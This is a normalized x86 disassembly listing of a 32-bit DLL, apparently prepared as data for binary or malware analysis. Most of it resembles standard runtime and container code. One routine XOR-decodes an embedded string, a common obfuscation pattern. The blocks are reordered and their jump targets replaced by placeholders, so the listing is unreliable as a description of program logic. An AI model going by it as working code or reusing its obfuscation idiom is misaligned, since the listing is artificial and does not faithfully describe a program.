fild [ ebp + 0x10 ]
fstp [ esp + 0x8 ]
jmp r-xdata
cmp eax 0xfffffc03
jge r-xdata
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x19
push 0x11
jmp r-xdata
push eax
push ecx
push ecx
fstp [ esp ]
call sub_1001c0c1
push esi
fstp [ ebp + 0x8 ]
push edi
call sub_100051e8
add esp 0x14
add eax 0x600
push eax
push ecx
push ecx
fstp [ esp ]
call sub_1001c0c1
add esp 0xc
jmp r-xdata
push edi
sub esp 0x18
fstp [ esp + 0x10 ]
fild [ ebp + 0x10 ]
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x19
push 0x12
jmp r-xdata
sub_1003ffc0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
push eax
push ecx
push edx
call sub_1004ec6c
mov esi eax
add esp 0xc
cmp esi 0xffffffff
jne r-xdata
pop esi
pop ebp
retn 0x10
call sub_1004fd6f
mov eax [ eax ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
mov eax esi
sub_10040000
push ebp
mov ebp esp
push 0xffffffff
push sub_100805db
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
call sub_10027f4f
push 0x4
mov [ ebp - 0x4 ] 0x0
call sub_10055606
mov edi eax
add esp 0x4
test edi edi
je r-xdata
xor edi edi
call sub_1006b5be
mov [ edi ] eax
call sub_10058bff
push 0x0
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_100014b7
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x10 ]
call sub_10050f50
jmp r-xdata
inc eax
mov [ ebx + 0x4 ] eax
lea eax [ esi + 0x8 ]
mov [ esi + 0x10 ] eax
lea ecx [ esi + 0x18 ]
mov [ esi + 0x20 ] ecx
lea edx [ esi + 0x1c ]
mov [ esi + 0x24 ] edx
mov [ esi + 0x38 ] edi
lea eax [ esi + 0xc ]
mov [ esi + 0x14 ] eax
lea ecx [ esi + 0x28 ]
mov [ esi + 0x30 ] ecx
lea edx [ esi + 0x2c ]
mov [ esi + 0x34 ] edx
mov [ eax ] 0x0
mov eax [ esi + 0x24 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x0
mov edx [ esi + 0x10 ]
mov [ edx ] 0x0
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x30 ]
mov [ ecx ] 0x0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_100400ee
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ ebp - 0xc ]
mov ebx ecx
push eax
push ebx
call sub_10037958
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_10010183
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_10015817
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn 0x18
sub_1004015c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
jmp r-xdata
cmp esi [ ebp + 0x10 ]
jne r-xdata
movzx eax [ esi ]
mov edx [ edi ]
push eax
push [ ebp + 0x8 ]
mov ecx edi
call [ edx + 0x8 ]
test al al
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
add esi 0x2
sub_1004018c
mov edi edi
push ebp
mov ebp esp
xor edx edx
cmp [ ebp + 0xc ] 0x7ff00000
jne r-xdata
cmp [ ebp + 0xc ] 0xfff00000
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
mov cx [ ebp + 0xe ]
mov eax 0x7ff8
push esi
mov esi eax
and cx si
pop esi
cmp cx ax
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
mov eax 0x7ff0
cmp cx ax
jne r-xdata
push 0x3
jmp r-xdata
push 0x2
xor eax eax
pop ebp
retn
test [ ebp + 0xc ] 0x7ffff
jne r-xdata
pop eax
pop ebp
retn
push 0x4
jmp r-xdata
cmp [ ebp + 0x8 ] edx
je r-xdata
sub_10040200
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
test edx edx
jne r-xdata
push ebx
push esi
push edi
mov edi [ ecx + 0x10 ]
cmp eax edi
jae r-xdata
cmp eax [ ecx + 0x10 ]
jbe r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
sub edi eax
cmp edx edi
ja r-xdata
mov esp ebp
pop ebp
retn 0xc
mov esi 0x1
sub esi edx
add edi esi
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
lea ebx [ ecx + eax ]
mov eax [ ebp + 0x8 ]
movsx ecx [ eax ]
push edi
push ecx
push ebx
call sub_10079480
mov esi eax
add esp 0xc
test esi esi
je r-xdata
mov ecx [ ecx ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push edx
push eax
push esi
call sub_10050b90
add esp 0xc
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov ecx [ ebp + 0x8 ]
movsx edx [ ecx ]
sub ebx esi
lea edi [ edi + ebx - 0x1 ]
push edi
push edx
lea ebx [ esi + 0x1 ]
push ebx
call sub_10079480
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
pop edi
mov eax esi
pop esi
sub eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ecx ]
sub_100402aa
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
test ebx ebx
jne r-xdata
test edx edx
je r-xdata
test edx edx
jne r-xdata
call sub_1004fd6f
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test ebx ebx
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov eax edx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov esi ecx
sub esi edx
mov esi edx
sub esi ecx
test ebx ebx
jne r-xdata
dec edi
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor ecx ecx
mov [ eax ] cx
dec ebx
jne r-xdata
xor eax eax
cmp ebx 0xffffffff
jne r-xdata
movzx eax [ ecx ]
mov [ esi + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx ecx [ esi + eax ]
mov [ eax ] cx
add eax 0x2
test cx cx
je r-xdata
mov [ edx ] ax
call sub_1004fd6f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ edx + ecx * 2 - 0x2 ] ax
pop eax
jmp r-xdata
call sub_1001d849
mov eax esi
jmp r-xdata
sub_10040380
push ebp
mov ebp esp
mov edx [ ebx + 0x8 ]
cmp edx 0x1ffffffe
jb r-xdata
inc edx
push edi
mov edi [ ebp + 0x10 ]
mov [ ebx + 0x8 ] edx
mov [ edi + 0x4 ] ecx
mov edx [ ebx + 0x4 ]
xor al al
cmp ecx edx
jne r-xdata
mov eax [ ebp + 0x10 ]
push eax
call sub_1006591f
add esp 0x4
push r--data
call sub_1002c5ed
cmp [ ebp + 0xc ] al
je r-xdata
mov [ edx + 0x4 ] edi
mov ecx [ ebx + 0x4 ]
mov [ ecx ] edi
mov edx [ ebx + 0x4 ]
jmp r-xdata
mov [ ecx + 0x8 ] edi
mov edx [ ebx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ ecx ] edi
mov edx [ ebx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x8 ] edi
mov edx [ edi + 0x4 ]
mov ecx edi
cmp [ edx + 0x14 ] al
jne r-xdata
mov [ edx ] edi
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov ecx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edi
mov [ ecx + 0x14 ] 0x1
pop edi
pop ebp
retn 0xc
push esi
mov esi [ esi ]
cmp [ esi + 0x14 ] al
jne r-xdata
mov esi [ esi + 0x8 ]
cmp [ esi + 0x14 ] al
jne r-xdata
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x14 ] 0x1
mov [ esi + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] al
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
jmp r-xdata
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x14 ] 0x1
mov [ esi + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] al
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
jmp r-xdata
mov edx [ ecx + 0x4 ]
mov [ edx + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] al
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx + 0x8 ]
mov edi [ esi ]
mov [ edx + 0x8 ] edi
mov edi [ esi ]
cmp [ edi + 0x15 ] al
jne r-xdata
mov ecx edx
mov edx [ ecx ]
mov esi [ edx + 0x8 ]
mov [ ecx ] esi
mov esi [ edx + 0x8 ]
cmp [ esi + 0x15 ] al
jne r-xdata
mov edx [ ecx + 0x4 ]
cmp [ edx + 0x14 ] al
je r-xdata
mov edx [ ecx + 0x4 ]
mov [ edx + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] al
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx ]
mov edi [ esi + 0x8 ]
mov [ edx ] edi
mov edi [ esi + 0x8 ]
cmp [ edi + 0x15 ] al
jne r-xdata
mov ecx edx
mov edx [ ecx + 0x8 ]
mov esi [ edx ]
mov [ ecx + 0x8 ] esi
mov esi [ edx ]
cmp [ esi + 0x15 ] al
jne r-xdata
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ebx + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ ecx + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ ebx + 0x4 ]
cmp ecx [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
mov esi [ edx + 0x4 ]
cmp edx [ esi ]
jne r-xdata
pop esi
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ebx + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ ecx + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ ebx + 0x4 ]
cmp ecx [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] ecx
mov edi [ edx + 0x4 ]
cmp edx [ edi ]
jne r-xdata
mov [ edi + 0x4 ] esi
jmp r-xdata
mov esi [ ecx + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov edi [ edx + 0x4 ]
cmp edx [ edi + 0x8 ]
jne r-xdata
mov [ edi + 0x4 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov esi [ ecx + 0x4 ]
cmp ecx [ esi ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ edi ] esi
jmp r-xdata
mov [ esi ] edx
mov [ esi ] edx
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov [ edi ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov edi [ ebp + 0x10 ]
mov [ edx + 0x4 ] esi
mov [ esi + 0x8 ] edx
mov [ esi ] edx
jmp r-xdata
mov [ edx ] ecx
mov [ ecx + 0x4 ] edx
sub_100405a5
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x10 ]
jmp r-xdata
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi [ ebp + 0x14 ]
jne r-xdata
xor eax eax
cmp edx [ ebp + 0xc ]
setne al
movzx eax [ edx ]
movzx ecx [ esi ]
cmp cx ax
ja r-xdata
or eax 0xffffffff
jmp r-xdata
jb r-xdata
pop esi
pop ebp
retn
xor eax eax
inc eax
jmp r-xdata
add edx 0x2
add esi 0x2
sub_100405ea
push 0x3c
mov eax sub_1007f76e
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x1c ]
and [ ebp - 0x24 ] 0x0
mov esi r--data
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x3c ] eax
movsb [ edi ] [ esi ]
mov [ ebp - 0x20 ] 0xf
mov [ ebp - 0x34 ] 0x0
mov al [ ebp + 0x24 ]
and [ ebp - 0x4 ] 0x0
test al al
jne r-xdata
mov [ ebp - 0x16 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x15 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x16 ] al
jmp r-xdata
push eax
push ebx
lea eax [ ebp - 0x18 ]
push eax
push [ ebp - 0x24 ]
push ecx
call sub_1002566a
mov esi eax
add esp 0x14
test esi esi
jne r-xdata
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x38 ] 0x10
and [ ebp - 0x48 ] 0x0
mov eax [ ebp - 0x34 ]
dec esi
cmp [ ebp - 0x20 ] 0x10
jae r-xdata
mov eax [ ebp - 0x38 ]
add eax eax
mov [ ebp - 0x38 ] eax
jmp r-xdata
lea ebx [ eax + 0x1 ]
test esi esi
je r-xdata
lea eax [ ebp - 0x34 ]
push 0x0
push [ ebp - 0x38 ]
lea ecx [ ebp - 0x34 ]
call sub_1003f510
cmp [ ebp - 0x20 ] 0x10
mov edi [ ebp - 0x44 ]
mov eax [ edi + 0x8 ]
mov ecx [ ebp - 0x34 ]
jae r-xdata
mov eax [ ebp + 0xc ]
mov esi [ ebp - 0x3c ]
mov [ esi ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x34 ]
mov [ esi + 0x4 ] eax
call sub_10041a20
mov eax esi
call sub_1004fa89
retn 0x20
add edi 0xc
xor eax eax
jle r-xdata
push edi
lea eax [ ebp - 0x48 ]
push eax
push esi
lea eax [ ebp - 0x40 ]
push ebx
push eax
call sub_100306ed
add esp 0x14
cmp eax 0xfffffffd
je r-xdata
push [ ebp - 0x40 ]
lea ecx [ ebp + 0xc ]
sub esi eax
add ebx eax
call sub_10044159
test esi esi
jne r-xdata
test eax eax
js r-xdata
jne r-xdata
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
push ebx
call sub_10079b60
pop ecx
inc eax
jmp r-xdata
sub_1004071e
push 0xe0
mov eax sub_1007fd56
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xa4 ] eax
movzx eax [ ebp + 0x1c ]
mov esi ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x90 ] ecx
mov [ ebp - 0x94 ] eax
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0x14 ] bl
je r-xdata
lea eax [ ebp - 0xac ]
push eax
call sub_100688a0
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10030b33
pop ecx
mov edi eax
mov [ ebp - 0x88 ] eax
lea ecx [ ebp - 0xac ]
lea eax [ ebp - 0xa8 ]
push eax
call sub_100688a0
push eax
mov [ ebp - 0x4 ] 0x1
call sub_100018ed
mov edi eax
pop ecx
mov [ ebp - 0x88 ] edi
lea ecx [ ebp - 0xa8 ]
jmp r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
sub eax [ ebp + 0x34 ]
push esi
inc eax
push eax
push ebx
lea ecx [ ebp + 0x24 ]
call sub_1000edbc
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
call sub_10069ce0
add esi 0x8
push esi
push ebx
push 0x30
call sub_1003088d
movzx esi ax
add esp 0xc
lea eax [ ebp - 0x48 ]
push eax
mov ecx edi
mov [ ebp - 0x98 ] esi
call sub_10051f6c
mov eax [ edi ]
mov ecx edi
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x1c ]
cdq
xor eax edx
sub eax edx
mov [ ebp - 0x8c ] eax
cmp [ ebp + 0x34 ] eax
ja r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
and [ ebp - 0x1c ] 0x0
push 0x7
pop edi
xor eax eax
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x2c ] ax
cmp [ ebp + 0x20 ] 0x0
mov esi [ ebp - 0x88 ]
mov eax [ esi ]
lea ecx [ ebp - 0x84 ]
push ecx
mov [ ebp - 0x4 ] 0x4
mov ecx esi
je r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
call [ eax + 0x20 ]
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0x80 ]
push eax
mov ecx esi
call sub_1004ff82
mov [ ebp - 0x4 ] 0x6
call [ eax + 0x24 ]
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0x80 ]
push eax
mov ecx esi
call sub_100202c4
mov [ ebp - 0x4 ] 0x5
jmp r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
mov edi [ ebp - 0x8c ]
xor bl bl
xor edx edx
xor ecx ecx
mov ecx [ ebp - 0x88 ]
lea eax [ ebp - 0x80 ]
push eax
call sub_10028071
push eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x8
call sub_10003a04
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x7
call sub_1000aecf
push eax
lea ecx [ ebp - 0x2c ]
call sub_10003a04
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
call sub_1000aecf
and [ ebp - 0x54 ] 0x0
xor eax eax
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x64 ] ax
mov eax [ ebp - 0x90 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x4 ] 0x7
test al 0x8
je r-xdata
mov ecx [ ebp - 0x88 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
cmp [ ebp - 0x34 ] 0x10
mov edi [ ebp - 0x48 ]
movzx ebx ax
jae r-xdata
inc edx
sub eax 0x4
je r-xdata
mov esi [ ebp + 0x34 ]
sub esi [ ebp - 0x8c ]
jmp r-xdata
lea edi [ ebp - 0x48 ]
inc ecx
cmp ecx 0x4
jb r-xdata
mov bl 0x1
add edx [ ebp - 0x54 ]
jmp r-xdata
sub eax 0x7
je r-xdata
mov al [ edi ]
cmp al 0x7f
jne r-xdata
movsx eax [ ebp + ecx - 0x84 ]
sub eax 0x20
je r-xdata
mov ecx [ ebp - 0x90 ]
cmp [ ecx + 0x24 ] 0x0
mov eax [ ecx + 0x20 ]
jl r-xdata
add edx [ ebp - 0x1c ]
jmp r-xdata
sub eax 0x4b
je r-xdata
test al al
jle r-xdata
xor esi esi
jg r-xdata
cmp [ ebp + 0x34 ] edi
ja r-xdata
dec eax
dec eax
je r-xdata
movsx eax al
cmp eax esi
jae r-xdata
xor ebx ebx
cmp eax 0x100
jne r-xdata
cmp eax edx
jbe r-xdata
test eax eax
je r-xdata
xor eax eax
mov eax edi
sub eax [ ebp + 0x34 ]
inc eax
jmp r-xdata
cmp ecx 0x3
je r-xdata
jmp r-xdata
push ebx
sub esi eax
push 0x1
push esi
lea ecx [ ebp + 0x24 ]
call sub_1000edbc
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
push [ ebp - 0x94 ]
mov [ ebp - 0xa0 ] eax
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x9c ] eax
call sub_10044159
mov eax [ ebp - 0xa0 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x9c ]
mov [ ebp + 0x10 ] eax
sub eax 0x4
je r-xdata
push esi
push [ ebp - 0x94 ]
lea eax [ ebp - 0xa0 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10050c26
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
xor esi esi
test bl bl
jne r-xdata
sub eax edx
mov esi eax
jmp r-xdata
xor esi esi
cmp esi edi
sbb esi esi
neg esi
add esi [ ebp + 0x34 ]
add esi eax
add edx esi
jmp r-xdata
mov edi eax
inc ebx
cmp ebx 0x4
jb r-xdata
push esi
push [ ebp - 0x94 ]
lea eax [ ebp - 0xb4 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10050c26
add esp 0x14
xor esi esi
cmp [ ebp - 0x50 ] 0x8
mov eax [ ebp - 0x64 ]
jae r-xdata
sub eax 0x7
je r-xdata
mov eax ecx
mov eax [ eax + 0x14 ]
and eax 0x1c0
mov [ ebp - 0x8c ] eax
cmp eax 0x40
je r-xdata
movsx eax [ ebp + ebx - 0x84 ]
sub eax 0x20
je r-xdata
cmp [ ebp - 0x1c ] 0x1
jbe r-xdata
push [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0xe4 ]
jmp r-xdata
lea eax [ ebp - 0x64 ]
cmp [ ebp - 0x1c ] 0x0
jbe r-xdata
sub eax 0x4b
je r-xdata
mov eax [ ebp - 0x90 ]
push esi
push [ ebp - 0x94 ]
xor edi edi
push [ ebp + 0x10 ]
mov [ eax + 0x20 ] edi
push [ ebp + 0xc ]
mov [ eax + 0x24 ] edi
push [ ebp - 0xa4 ]
call sub_10050c26
add esp 0x14
xor esi esi
push edi
inc esi
push esi
lea ecx [ ebp - 0x64 ]
call sub_1000aecf
push edi
push esi
lea ecx [ ebp - 0x2c ]
call sub_1000aecf
push edi
push esi
lea ecx [ ebp - 0x48 ]
call sub_10041a20
push edi
push esi
lea ecx [ ebp + 0x24 ]
call sub_1000aecf
mov eax [ ebp - 0xa4 ]
call sub_1004fa89
retn 0x38
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
test edi edi
jne r-xdata
dec eax
dec eax
je r-xdata
mov ecx [ ebp - 0x1c ]
add eax 0x2
dec ecx
push ecx
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0xb4 ]
push [ ebp + 0xc ]
push eax
call sub_1004177f
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
lea eax [ ebp - 0x2c ]
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
push 0x1
push eax
lea eax [ ebp - 0xec ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp + 0x34 ] edi
ja r-xdata
cmp [ ebp + 0x38 ] 0x8
mov eax [ ebp + 0x24 ]
jae r-xdata
cmp [ ebp - 0x8c ] 0x100
jne r-xdata
jmp r-xdata
cmp [ ebp + 0x38 ] 0x8
mov eax [ ebp + 0x24 ]
jae r-xdata
push [ ebp - 0x98 ]
lea ecx [ ebp + 0xc ]
call sub_10044159
mov ecx [ ebp - 0x88 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
movzx eax ax
push eax
lea ecx [ ebp + 0xc ]
call sub_10044159
mov eax edi
sub eax [ ebp + 0x34 ]
push eax
push [ ebp - 0x98 ]
lea eax [ ebp - 0xd4 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10050c26
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x14
cmp [ ebp + 0x38 ] 0x8
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0x24 ]
jae r-xdata
push [ ebp + 0x34 ]
push eax
lea eax [ ebp - 0xbc ]
lea eax [ ebp + 0x24 ]
mov ecx [ ebp + 0x34 ]
sub ecx edi
push ecx
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0xcc ]
push [ ebp + 0xc ]
push eax
call sub_1004177f
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x88 ]
mov [ ebp + 0x10 ] eax
mov eax [ ecx ]
add esp 0x14
call [ eax + 0x4 ]
movzx eax ax
push eax
lea ecx [ ebp + 0xc ]
call sub_10044159
cmp [ ebp + 0x38 ] 0x8
mov eax [ ebp + 0x24 ]
jae r-xdata
lea eax [ ebp + 0x24 ]
push [ ebp + 0x34 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xc4 ]
jmp r-xdata
lea ecx [ ebp + 0x24 ]
mov ecx [ ebp + 0x34 ]
sub ecx edi
lea eax [ eax + ecx * 2 ]
push edi
push eax
lea eax [ ebp - 0xdc ]
jmp r-xdata
lea eax [ ebp + 0x24 ]
push eax
call sub_1004177f
add esp 0x14
jmp r-xdata
sub_10040c97
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x16
pop edi
push edi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_10018870
add esp 0x14
test esi esi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
call sub_1004fd6f
mov [ eax ] edi
call sub_1001d849
mov eax edi
jmp r-xdata
push ebx
mov ebx [ ebp - 0x28 ]
xor eax eax
dec ebx
cmp [ ebp - 0x2c ] 0x2d
sete al
lea edi [ eax + esi ]
cmp ecx 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10024145
leave
retn
sub ecx eax
or ecx ecx
jmp r-xdata
mov eax [ ebp - 0x28 ]
dec eax
cmp ebx eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ esi ] 0x0
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
push [ ebp + 0x14 ]
push ecx
push edi
call sub_100458a4
add esp 0x10
test eax eax
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x1
push eax
push [ ebp + 0x18 ]
mov eax esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_1007cd82
add esp 0x18
cmp eax [ ebp + 0x14 ]
jge r-xdata
pop ebx
test cl cl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x1
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
call sub_1007cee3
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
mov [ edi - 0x2 ] al
sub_10040db0
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + r--data ]
xor cl cl
cmp [ eax + 0x4 ] 0x0
jbe r-xdata
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] 0x0
retn
push esi
xor esi esi
mov edx [ eax ]
mov dl [ edx + esi ]
xor dl [ eax + 0x8 ]
xor dl cl
inc cl
mov [ esi + edi ] dl
movzx esi cl
cmp esi [ eax + 0x4 ]
jb r-xdata
mov eax [ eax + 0x4 ]
mov [ edi + eax ] 0x0
pop esi
retn
sub_10040ded
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_1005ed96
test al al
je r-xdata
mov edi [ ebp + 0xc ]
push 0x0
push edi
mov ecx esi
call sub_1002a5ec
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
